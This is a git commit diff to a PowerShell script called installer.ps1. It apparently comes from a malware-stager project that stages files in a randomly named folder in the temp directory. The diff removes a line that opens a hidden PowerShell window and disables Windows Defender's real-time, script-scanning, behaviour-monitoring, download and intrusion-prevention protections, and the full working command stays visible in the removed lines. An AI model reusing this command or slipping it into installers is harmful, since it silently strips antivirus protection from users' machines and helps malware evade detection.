3fb20b7b9e3ada8166a987abf48ba765d08ff335
jfrdgh <162196506+jfrdgh@users.noreply.github.com>
2024-03-09 23:41:31 +0000

    Update installer.ps1

--- installer.ps1
+++ installer.ps1
@@ -6,9 +6,6 @@ function random_text {
     return -join ((65..90) + (97..122) | Get-Random -Count 5 | %  {[char]$_})
 }
 
-# disable windefender
-powershell powershell.exe -windowstyle hidden 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'
-
 # goto temp & make working directory
 $wd = random_text
 $path = "$env:TEMP/$wd"
@@ -20,4 +17,3 @@ mkdir $path
 cd $path
 echo "" > poc. txt
 cd "C:\Users\dylan\Documents\Personal Projects\Quention\files"
-pause
